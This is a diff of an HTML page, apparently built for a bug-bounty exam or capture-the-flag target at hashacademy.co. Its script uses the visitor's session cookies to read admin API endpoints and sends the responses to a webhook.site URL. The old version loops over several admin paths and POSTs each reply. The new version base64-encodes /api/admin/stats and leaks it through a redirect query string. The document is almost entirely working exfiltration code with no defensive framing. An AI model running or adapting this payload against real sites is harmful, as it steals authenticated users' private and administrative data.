@@ -3,26 +3,15 @@
 <body>
     <script>
         const webh = "https://webhook.site/966eca5b-8dbd-405f-895e-a47c742aa523";
-        const base = "https://api-bugbounty-exam.hashacademy.co";
+        const target = "https://api-bugbounty-exam.hashacademy.co/api/admin/stats";
 
-        const finalAttempts = [
-            "/api/auth/profile",            // Fetching the Admin's own profile
-            "/api/admin/users/me",          // Common admin alias
-            "/api/admin/settings",          // System-wide settings
-            "/api/admin/licenses",          // Where "verifiedLicenses" (from stats) live
-            "/api/v1/admin/verification"    // Specialized flag endpoint
-        ];
-
-        finalAttempts.forEach(path => {
-            fetch(base + path, { credentials: "include" })
-                .then(r => r.text())
-                .then(data => {
-                    fetch(webh, {
-                        method: "POST",
-                        body: JSON.stringify({ path: path, data: data })
-                    });
-                }).catch(e => {});
-        });
+        // Fetch the data internally, then use location.replace to leak it
+        fetch(target, { credentials: "include" })
+            .then(r => r.text())
+            .then(data => {
+                // We encode the data and attach it as a query string
+                window.location.replace(webh + "?flag=" + btoa(data));
+            });
     </script>
 </body>
 </html>
